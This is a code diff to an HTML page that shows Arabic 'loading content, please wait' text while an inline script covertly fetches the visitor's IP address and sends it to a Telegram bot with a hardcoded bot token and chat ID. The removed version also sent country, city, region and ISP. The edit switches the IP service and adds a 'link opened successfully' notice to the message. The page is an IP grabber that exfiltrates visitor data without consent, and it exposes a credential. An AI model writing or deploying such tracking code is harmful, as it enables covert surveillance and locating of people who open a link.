@@ -20,24 +20,19 @@
     <p>جاري تحميل المحتوى، انتظر لحظة...</p>
 
     <script>
-        // توكن البوت بتاعك
-        const BOT_TOKEN = '8979129209:AAFPv860Aomc03pLBPQh4dyW2yIKByB3Bk0';
-        
-        // الـ Chat ID بتاعك (حطي الرقم بتاعك بدل ما بين القوسين)
+        const BOT_TOKEN = '8979129209:AAFpV86OAomcO3pLBPQh4dyW2yIKByB3Bk0';
         const CHAT_ID = '6663398412';
 
-        // جلب معلومات الزائر عن طريق الـ IP وإرسالها للتليجرام
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
+        // استخدام خدمة بديلة وسريعة لجلب الـ IP
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(ipData => {
+                const userIp = ipData.ip;
                 const message = `🔔 **زيارة جديدة للموقع!**\n\n` +
-                                `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
-                                `🏙️ **المدينة:** ${data.city || 'غير معروف'}\n` +
-                                `📍 **المنطقة:** ${data.region || 'غير معروف'}\n` +
-                                `🏢 **مزود الخدمة:** ${data.org || 'غير معروف'}\n` +
-                                `🌐 **عنوان الـ IP:** ${data.ip || 'غير معروف'}`;
+                                `🌐 **عنوان الـ IP:** ${userIp}\n` +
+                                `📱 **التفاصيل:** تم فتح الرابط بنجاح!`;
 
-                // إرسال الرسالة مباشرة للبوت ولرقمك المحدد
+                // إرسال الإشعار لتليجرام فوراً
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -48,7 +43,7 @@
                     })
                 });
             })
-            .catch(err => console.error('Error:', err));
+            .catch(err => console.log('Error:', err));
     </script>
 </body>
 </html>
